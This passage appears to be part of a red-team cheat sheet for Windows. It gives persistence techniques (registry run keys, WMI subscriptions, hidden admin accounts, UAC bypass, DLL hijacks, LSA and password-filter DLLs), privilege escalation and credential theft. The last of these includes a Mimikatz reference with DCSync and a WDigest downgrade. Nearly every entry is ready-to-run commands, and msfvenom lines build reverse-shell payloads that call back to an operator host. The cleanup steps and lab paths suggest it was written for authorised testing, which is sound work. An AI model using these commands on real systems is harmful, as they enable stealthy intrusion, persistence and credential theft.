reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ /d "1" /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Debugger /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /f
```

---

## 38. Application Shim (AppCompat)
**TTP:** T1546.011 | **Admin:** ✅ | **APT:** CarbonSpider, FIN7

```batch
sdbinst.exe evil.sdb
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"

:: Cleanup
sdbinst.exe -u evil.sdb
```

---

## 39. WMI Event Subscription
**TTP:** T1546.003 | **Admin:** ✅ | **APT:** APT29, APT33, Lazarus Group, Turla

```powershell
$filterArgs = @{
    Name = "INFilter"; EventNameSpace = "root\cimv2"; QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='wordpad.exe'"
}
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{ Name = "INConsumer"; CommandLineTemplate = "{path}" }
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $consumerArgs

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
}

# Verify
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer

# Cleanup
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='INFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='INConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

## 40. Hidden User Account
**TTP:** T1136.001 + T1564.002 | **Admin:** ✅ | **APT:** APT33, OilRig, Lazarus Group

```powershell
net user WinlogonService Password123 /add
net localgroup "Administrators" /add WinlogonService
net localgroup "Remote Desktop Users" /add WinlogonService

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WinlogonService /t REG_DWORD /d 0 /f

# Cleanup
net user WinlogonService /del
```

---

## 41. fodhelper UAC Bypass
**TTP:** T1548.002 | **Admin:** ❌ | **APT:** APT29, APT41, Turla

```powershell
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "{path}" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
start C:\Windows\System32\fodhelper.exe

whoami /groups | findstr "High"

# Cleanup
reg delete "HKCU\Software\Classes\ms-settings" /f
```

---

## 42. WSL Persistence
**TTP:** T1059.004 | **Admin:** ❌ | **APT:** Custom/Red Team

```bash
# bashrc (every WSL terminal)
echo "cmd.exe /c C:\\path\\to\\{implant}.exe" >> ~/.bashrc

# cron (reboot)
crontab -e
# @reboot cmd.exe /c C:\\path\\to\\{implant}.exe

# profile (login shell)
echo "cmd.exe /c C:\\path\\to\\{implant}.exe" >> ~/.profile
```

---

## 43. DPAPI CurrentUser Registry Loader
**TTP:** T1027.013 | **Admin:** ❌ | **APT:** APT28, APT29, Lazarus Group

```powershell
Add-Type -AssemblyName System.Security

$bytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$encrypted = [System.Security.Cryptography.ProtectedData]::Protect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$encBase64 = [Convert]::ToBase64String($encrypted)
reg add "HKCU\Software\Microsoft\WindowsUpdate" /v "CfgData" /t REG_SZ /d $encBase64 /f

# Loader
$encBase64 = (Get-ItemProperty "HKCU:\Software\Microsoft\WindowsUpdate").CfgData
$encBytes = [Convert]::FromBase64String($encBase64)
$decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$implantPath = [System.Text.Encoding]::UTF8.GetString($decBytes)
Start-Process $implantPath

# Cleanup
reg delete "HKCU\Software\Microsoft\WindowsUpdate" /v CfgData /f
```

---

## 44. DPAPI Machine Scope
**TTP:** T1027.013 | **Admin:** ✅ | **APT:** APT28, APT29

```powershell
Add-Type -AssemblyName System.Security
$bytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$encrypted = [System.Security.Cryptography.ProtectedData]::Protect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine)
$encBase64 = [Convert]::ToBase64String($encrypted)
reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\Cfg" /v "SvcBlob" /t REG_SZ /d $encBase64 /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\WindowsNT\Cfg" /f
```

---

## 45. AES Encrypted Registry Loader
**TTP:** T1027.013 | **Admin:** ❌ | **APT:** Lazarus Group, APT41

```powershell
$key = [System.Security.Cryptography.Aes]::Create()
$key.KeySize = 256; $key.GenerateKey(); $key.GenerateIV()

$plainBytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$enc = $key.CreateEncryptor()
$encBytes = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

reg add "HKCU\Software\Microsoft\Sync" /v "Payload" /t REG_SZ /d ([Convert]::ToBase64String($encBytes)) /f
reg add "HKCU\Software\Microsoft\Sync" /v "K" /t REG_SZ /d ([Convert]::ToBase64String($key.Key)) /f
reg add "HKCU\Software\Microsoft\Sync" /v "I" /t REG_SZ /d ([Convert]::ToBase64String($key.IV)) /f

# Loader
$payload = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").Payload)
$K = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").K)
$I = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").I)
$aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $K; $aes.IV = $I
$dec = $aes.CreateDecryptor()
$decBytes = $dec.TransformFinalBlock($payload, 0, $payload.Length)
Start-Process ([System.Text.Encoding]::UTF8.GetString($decBytes))

# Cleanup
reg delete "HKCU\Software\Microsoft\Sync" /f
```

---

## 46. XOR + DPAPI + RunKey (Full Combo)
**TTP:** T1027 + T1547.001 | **Admin:** ❌ | **APT:** APT28, APT29, Lazarus Group

```powershell
# XOR Obfuscation
function XorBytes($data, $key) {
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) { $out[$i] = $data[$i] -bxor $key[$i % $key.Length] }
    return $out
}
$path   = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$xorKey = [System.Text.Encoding]::UTF8.GetBytes("M4n1k4nd4n")
$xored  = XorBytes $path $xorKey
reg add "HKCU\Software\Microsoft\EdgeUpdate" /v "Blob" /t REG_SZ /d ([Convert]::ToBase64String($xored)) /f
reg add "HKCU\Software\Microsoft\EdgeUpdate" /v "K" /t REG_SZ /d "M4n1k4nd4n" /f

# DPAPI + RunKey
$loaderScript = @'
Add-Type -AssemblyName System.Security
$enc = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Cfg").Data)
$dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
Start-Process ([System.Text.Encoding]::UTF8.GetString($dec))
'@
$loaderScript | Out-File "C:\ProgramData\loader.ps1" -Encoding UTF8

Add-Type -AssemblyName System.Security
$bytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$enc = [System.Security.Cryptography.ProtectedData]::Protect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
reg add "HKCU\Software\Microsoft\Cfg" /v "Data" /t REG_SZ /d ([Convert]::ToBase64String($enc)) /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CfgSvc" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\loader.ps1" /f

# Cleanup
reg delete "HKCU\Software\Microsoft\EdgeUpdate" /f
reg delete "HKCU\Software\Microsoft\Cfg" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CfgSvc /f
del "C:\ProgramData\loader.ps1"
```

---

## — DLL-BASED PERSISTENCE TECHNIQUES —

> **Payload generation:**
> ```
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > payload.dll
> ```

---

## 47. AppInit_DLLs
**TTP:** T1546.010 | **Admin:** ✅ | **APT:** Turla, APT29

```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f

:: Cleanup
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f
```

---

## 48. COM DLL Hijack (HKCU Override)
**TTP:** T1546.015 | **Admin:** ❌ | **APT:** APT28, Turla, BRONZE BUTLER

```batch
reg add "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

:: Cleanup
reg delete "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}" /f
```

> **Tip:** Use Process Monitor filter `Result = NAME NOT FOUND` to find hijackable CLSIDs.

---

## 49. Service DLL — svchost.exe
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Lazarus Group, FIN7, Carbanak

```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v Type /t REG_DWORD /d 32 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v FakeGroup /t REG_MULTI_SZ /d "FakeSvc" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v ImagePath /t REG_EXPAND_SZ /d "%SystemRoot%\System32\svchost.exe -k FakeGroup" /f
sc start FakeSvc

:: Cleanup
sc stop FakeSvc && sc delete FakeSvc
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v FakeGroup /f
```

> **DLL export required:** `ServiceMain`

---

## 50. Winlogon Notification Package DLL
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla, PLATINUM

```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /v DllName /t REG_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /v Logon /t REG_SZ /d "WinlogonLogonEvent" /f

:: Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /f
```

---

## 51. LSA Security Support Provider (SSP) DLL
**TTP:** T1547.005 | **Admin:** ✅ | **APT:** Turla, APT28, PLATINUM

```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0payload" /f
copy "C:\lab\payload.dll" "C:\Windows\System32\payload.dll"

:: Restore
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u" /f
```

---

## 52. rundll32 + RunKey (Reflective DLL)
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** FIN7, Carbanak

```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SyncSvc" /t REG_SZ /d "rundll32.exe C:\lab\payload.dll,EntryPoint" /f

:: Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SyncSvc /f
```

---

## 53. Scheduled Task — rundll32 DLL
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group

```powershell
schtasks /create /tn "WinSyncDLL" /sc onlogon /tr "rundll32.exe C:\lab\payload.dll,main" /f
schtasks /query /tn "WinSyncDLL" /fo LIST /v

# Cleanup
schtasks /delete /tn "WinSyncDLL" /f
```

---

## 54. Phantom DLL Hijack
**TTP:** T1574.001 | **Admin:** ❌ | **APT:** APT41, Lazarus Group, PowerGhost

```powershell
Copy-Item "C:\lab\payload.dll" "$env:LOCALAPPDATA\Microsoft\WindowsApps\wbemcomn.dll"
Copy-Item "C:\lab\payload.dll" "C:\Git\bin\version.dll"
$env:PATH -split ";"

# Cleanup
Remove-Item "$env:LOCALAPPDATA\Microsoft\WindowsApps\wbemcomn.dll" -ErrorAction SilentlyContinue
```

> **Hunting:** ProcMon filter — `Result = NAME NOT FOUND` + `Path ends with .dll`

---

## 55. .NET Profiler DLL (COR_PROFILER)
**TTP:** T1574.012 | **Admin:** ❌ | **APT:** Lazarus Group, Turla

```powershell
reg add "HKCU\Environment" /v COR_ENABLE_PROFILING /t REG_SZ /d "1" /f
reg add "HKCU\Environment" /v COR_PROFILER /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
reg add "HKCU\Environment" /v COR_PROFILER_PATH /t REG_SZ /d "C:\lab\payload.dll" /f

# Cleanup
reg delete "HKCU\Environment" /v COR_ENABLE_PROFILING /f
reg delete "HKCU\Environment" /v COR_PROFILER /f
reg delete "HKCU\Environment" /v COR_PROFILER_PATH /f
```

> **DLL export required:** `DllGetClassObject`

---

## 56. ETW Provider Hijack DLL
**TTP:** T1574 | **Admin:** ✅ | **APT:** Nation-state actors

```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /v "MessageFileName" /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /v "ResourceFileName" /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f

:: Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /f
```

---

## 57. AMSI Provider DLL
**TTP:** T1562.001 | **Admin:** ✅ | **APT:** Nation-state actors

```powershell
$guid = "{CAFEBABE-1337-1337-1337-CAFEBABE1337}"
reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers\$guid" /ve /t REG_SZ /d "C:\lab\amsi_provider.dll" /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\$guid" /f
```

> **DLL exports required:** `AmsiInitialize`, `AmsiOpenSession`, `AmsiScanBuffer`, `AmsiScanString`, `AmsiCloseSession`, `AmsiUninitialize`

---

## 58. Print Processor DLL
**TTP:** T1547.012 | **Admin:** ✅ | **APT:** Lazarus Group, APT28

```batch
copy "C:\lab\payload.dll" "C:\Windows\System32\spool\prtprocs\x64\evil_proc.dll"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProc" /v Driver /t REG_SZ /d "evil_proc.dll" /f
net stop spooler && net start spooler

:: Cleanup
net stop spooler
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProc" /f
del "C:\Windows\System32\spool\prtprocs\x64\evil_proc.dll"
net start spooler
```

> **DLL exports required:** `EnumPrintProcessorDatatypes`, `OpenPrintProcessor`, `PrintDocumentOnPrintProcessor`, `ClosePrintProcessor`

---

## 59. Winsock LSP DLL
**TTP:** T1574 | **Admin:** ❌/✅ | **APT:** Custom/Red Team

```powershell
netsh winsock add provider "C:\lab\lsp_payload.dll"
netsh winsock show catalog
netsh winsock remove provider <catalog-id>
netsh winsock reset  # nuclear
```

> **DLL export required:** `WSPStartup`

---

## 60. netsh Helper DLL
**TTP:** T1574.001 | **Admin:** ✅ | **APT:** Custom/Red Team

```batch
netsh add helper C:\lab\payload.dll
netsh show helper
reg delete "HKLM\SOFTWARE\Microsoft\NetSh" /v <value_name> /f
```

> **DLL export required:** `InitHelperDll`

---

## 61. WMI Provider DLL
**TTP:** T1546.003 | **Admin:** ✅ | **APT:** APT29, Turla

```powershell
reg add "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
mofcomp.exe C:\lab\evil_provider.mof

# Cleanup
reg delete "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}" /f
```

---

## 62. Network Provider DLL
**TTP:** T1556.008 | **Admin:** ✅ | **APT:** APT28, Lazarus Group

```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP\NetworkProvider" /v Name /t REG_SZ /d "EvilNP" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP\NetworkProvider" /v ProviderPath /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder /t REG_SZ /d "RDPNP,LanmanWorkstation,webclient,EvilNP" /f

:: Cleanup
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP" /f
```

> **DLL exports required:** `NPGetCaps`, `NPLogonNotify`, `NPPasswordChangeNotify`

---

## 63. Password Filter DLL (SAM)
**TTP:** T1556.002 | **Admin:** ✅ | **APT:** APT28, Lazarus Group

```batch
copy "C:\lab\payload.dll" "C:\Windows\System32\passfilt_evil.dll"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0passfilt_evil" /f

:: Restore
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli" /f
del "C:\Windows\System32\passfilt_evil.dll"
```

> **DLL exports required:** `InitializeChangeNotify`, `PasswordFilter`, `PasswordChangeNotify`

---

## 64. WinRT DLL Activation (HKCU)
**TTP:** T1574.002 | **Admin:** ❌ | **APT:** Custom/Red Team

```powershell
$className = "Windows.UI.Notifications.ToastNotificationManager"
reg add "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /v DllPath /t REG_SZ /d "C:\lab\payload.dll" /f

# Cleanup
reg delete "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /f
```

---

## 65. Credential Provider DLL
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla

```batch
copy "C:\lab\payload.dll" "C:\Windows\System32\evil_cp.dll"
reg add "HKLM\SOFTWARE\Classes\CLSID\{EVILCP01-0000-0000-0000-000000000001}\InprocServer32" /ve /t REG_SZ /d "evil_cp.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{EVILCP01-0000-0000-0000-000000000001}" /ve /t REG_SZ /d "EvilCP" /f

:: Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{EVILCP01-0000-0000-0000-000000000001}" /f
del "C:\Windows\System32\evil_cp.dll"
```

> **Interface required:** `ICredentialProvider`

---

## 66. Shell Extension DLL (Context Menu)
**TTP:** T1574.001 | **Admin:** ❌ | **APT:** Turla, APT28

```powershell
$guid = "{SHELLEXT-1337-1337-1337-SHELLEXT13370}"
reg add "HKCU\Software\Classes\*\shellex\ContextMenuHandlers\EvilMenu" /ve /t REG_SZ /d $guid /f
reg add "HKCU\Software\Classes\CLSID\$guid\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" /v $guid /t REG_SZ /d "EvilShellExt" /f

# Cleanup
reg delete "HKCU\Software\Classes\*\shellex\ContextMenuHandlers\EvilMenu" /f
reg delete "HKCU\Software\Classes\CLSID\$guid" /f
```

> **DLL interfaces required:** `IContextMenu`, `IShellExtInit`

---

## 67. DiagTrack DLL Hijack
**TTP:** T1574.002 | **Admin:** ❌ | **APT:** Custom/Red Team

```powershell
Copy-Item "C:\lab\payload.dll" "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v ExtensionDll /t REG_SZ /d "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll" /f

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v ExtensionDll /f
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll"
```

---

# — PRIVILEGE ESCALATION —

---

## Initial Recon

```powershell
whoami /all
whoami /priv
whoami /groups
systeminfo
hostname
net user %username%
net localgroup administrators
```

---

## Automated Enumeration Tools

```powershell
# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit

# beRoot
.\beRoot.exe

# Windows Exploit Suggester
systeminfo > sysinfo.txt
python wes.py sysinfo.txt
python wes.py sysinfo.txt --exploits-only
```

---

## 68. Unquoted Service Path
**TTP:** T1574.009 | **Admin:** ❌→✅ | **APT:** FIN7, APT41

```powershell
# Find unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows" | findstr /iv '"'

# Manual check
sc qc <ServiceName>

# If path = C:\Program Files\My Service\service.exe (unquoted)
# Drop implant at: C:\Program.exe  OR  C:\Program Files\My.exe

copy {path} "C:\Program Files\My.exe"

# Restart service / reboot
sc stop <ServiceName>
sc start <ServiceName>

# Cleanup
del "C:\Program Files\My.exe"
```

---

## 69. Weak Service Binary Permissions
**TTP:** T1574.010 | **Admin:** ❌→✅ | **APT:** FIN7

```powershell
# Find writable service binaries
.\accesschk.exe -uwdqs "Users"      "C:\Program Files"
.\accesschk.exe -uwdqs "Everyone"   "C:\Program Files"
.\accesschk.exe -uwdqs "Users"      "C:\Program Files (x86)"

# If writable: overwrite binary
copy {path} "C:\Program Files\VulnService\service.exe" /y

# Restart
sc stop VulnService && sc start VulnService

# Cleanup
# Restore original binary
```

---

## 70. Weak Service Registry Permissions
**TTP:** T1574 | **Admin:** ❌→✅ | **APT:** APT28

```powershell
# Check registry ACLs on services
.\accesschk.exe -kwqs "Users"                "HKLM\System\CurrentControlSet\Services"
.\accesschk.exe -kwqs "Authenticated Users"  "HKLM\System\CurrentControlSet\Services"

# If writable service registry key found
reg add "HKLM\System\CurrentControlSet\Services\<VulnSvc>" /v ImagePath /t REG_SZ /d "{path}" /f

sc stop <VulnSvc> && sc start <VulnSvc>
```

---

## 71. AlwaysInstallElevated (MSI)
**TTP:** T1548 | **Admin:** ❌→✅ | **APT:** Custom/Red Team

```batch
:: Check if enabled (both must = 1)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi
```

```batch
:: Execute (installs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

---

## 72. Token Impersonation (PrintSpoofer / GodPotato)
**TTP:** T1134 | **Admin:** ❌→✅ | **APT:** Custom/Red Team

```powershell
# Check privileges
whoami /priv | findstr /i "SeImpersonate SeAssignPrimary SeBackup SeRestore SeTakeOwnership"

# PrintSpoofer (SeImpersonatePrivilege → SYSTEM)
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "powershell -nop -w hidden -c {payload}"

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c {path}"

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p {path}
```

---

## 73. DLL Hijack in SYSTEM Service
**TTP:** T1574.001 | **Admin:** ❌→✅ | **APT:** APT41, Lazarus Group

```powershell
# Find SYSTEM services loading missing DLLs
# ProcMon filter: Process Name = <svc>.exe | Result = NAME NOT FOUND | Path ends with .dll

# Find writable directory in service DLL search path
.\accesschk.exe -uwdqs "Users" "C:\Program Files\<TargetService>"

# Drop malicious DLL with matching name
copy {path} "C:\Program Files\<TargetService>\missing.dll"

# Restart service
sc stop <TargetService> && sc start <TargetService>
```

---

## 74. SeImpersonatePrivilege Abuse
**TTP:** T1134.001 | **Admin:** ❌→✅ | **APT:** Custom/Red Team

Commonly available to: IIS AppPool, SQL Server service accounts, meterpreter shells via web exploits.

```powershell
whoami /priv

# If SeImpersonatePrivilege = Enabled
.\PrintSpoofer.exe -i -c "cmd /c whoami"
.\GodPotato.exe -cmd "whoami"

# Verify SYSTEM
whoami
```

---

## 75. Stored Credential Abuse (cmdkey)
**TTP:** T1555 | **Admin:** ❌ | **APT:** APT33, OilRig

```powershell
# List stored credentials
cmdkey /list
C:\Windows\System32\cmdkey.exe /list

# Use stored credential with runas
runas /savecred /user:<DOMAIN>\<USER> "cmd.exe"
runas /savecred /user:Administrator "powershell.exe -nop -w hidden"

# Check credential files
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\
dir /a %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
```

---

# — POST-EXPLOITATION —

---

## Credential Hunting

```powershell
# Winlogon autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# All password strings in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattend / Sysprep (plaintext passwords)
dir /b /s C:\Windows\Panther\unattend.xml
dir /b /s C:\Windows\Panther\Unattend\
dir /b /s C:\Windows\System32\Sysprep\sysprep.xml
dir /b /s C:\Windows\System32\Sysprep\sysprep.inf

# File system search
dir /s /b *pass* *cred* *vnc* *config* 2>nul
dir /b /s web.config
dir /b /s unattend.xml

# String search in files
findstr /si "password" *.xml *.ini *.txt *.config
findstr /si "secret"   *.xml *.ini *.txt
findstr /si "cred"     *.xml *.ini *.txt

# Dump all files list
dir C:\ /b /a /s > creds.txt
findstr /i "pass\|secret\|cred" creds.txt
```

---

## SessionGopher — Session Credential Harvesting

```powershell
Import-Module .\SessionGopher.ps1

Invoke-SessionGopher                           # current host
Invoke-SessionGopher -Thorough                 # deeper sweep
Invoke-SessionGopher -Target <IP>              # remote host
Invoke-SessionGopher -AllDomain               # domain-wide (DA)
```

**Harvests:** PuTTY, WinSCP, FileZilla, RDP, SuperPuTTY session credentials.

---

## LaZagne — Multi-Application Password Recovery

```batch
:: All modules
.\LaZagne.exe all

:: Specific modules
.\LaZagne.exe browsers
.\LaZagne.exe windows
.\LaZagne.exe wifi
.\LaZagne.exe mail
.\LaZagne.exe git
.\LaZagne.exe database

:: Write output
.\LaZagne.exe all -oN
.\LaZagne.exe all -oJ   :: JSON
```

**Targets:** Chrome, Firefox, Edge, Outlook, FileZilla, PuTTY, WiFi, Windows Vault, Git, SVN.

---

## psrecon — PowerShell Recon Framework

```powershell
Import-Module .\PSRecon.ps1
Invoke-PSRecon

# Or run directly
powershell -ep bypass -f PSRecon.ps1
```

**Collects:** system info, users, groups, processes, services, network config, scheduled tasks, installed software, browser history, clipboard.

---

## Mimikatz — Full Command Reference

```batch
:: Run as admin
mimikatz.exe

:: Enable debug privilege (required first)
privilege::debug

:: Elevate to SYSTEM
token::elevate

:: === CREDENTIAL DUMPING ===

:: Logon passwords (plaintext if WDigest enabled)
sekurlsa::logonpasswords

:: NTLM hashes only
sekurlsa::msv

:: Kerberos tickets
sekurlsa::tickets

:: Kerberos keys
sekurlsa::ekeys

:: Wdigest plaintext
sekurlsa::wdigest

:: SAM dump (local hashes — needs SYSTEM)
lsadump::sam

:: LSA secrets
lsadump::secrets

:: LSA cache (domain cached creds)
lsadump::cache

:: DCSYNC — dump any account (needs DA or replication rights)
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:krbtgt
lsadump::dcsync /domain:<domain> /all /csv

:: === ENABLE WDIGEST (plaintext on next login) ===
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

